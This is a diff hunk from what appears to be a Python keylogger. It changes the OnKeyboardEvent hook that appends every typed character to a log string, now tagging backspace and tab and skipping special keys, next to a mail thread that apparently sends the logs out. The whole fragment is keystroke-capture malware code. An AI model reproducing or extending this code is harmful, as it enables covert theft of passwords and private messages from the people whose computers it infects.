@@ -137,15 +137,16 @@ def OnKeyboardEvent(event):
             SendMailThread.start()
         exit()
 
-    if event.Key == "Back":
+    if event.Ascii == 8:
         if blnBackRemove == "True":
             if not strLogs == "":
                 strLogs = strLogs[0:len(strLogs) - 1]
         else:
-            strLogs = strLogs + " [Back] "
-
-    elif event.Key == "Delete":
-        strLogs = strLogs + " [Delete] "
+            strLogs = strLogs + " [BckSpace] "
+    elif event.Ascii == 9:
+        strLogs = strLogs + " [Tab] "
+    elif event.Ascii == 0:  # if the key is a special key such as alt, win, etc. Pass
+        pass
     else:
         strLogs = strLogs + chr(event.Ascii)
 
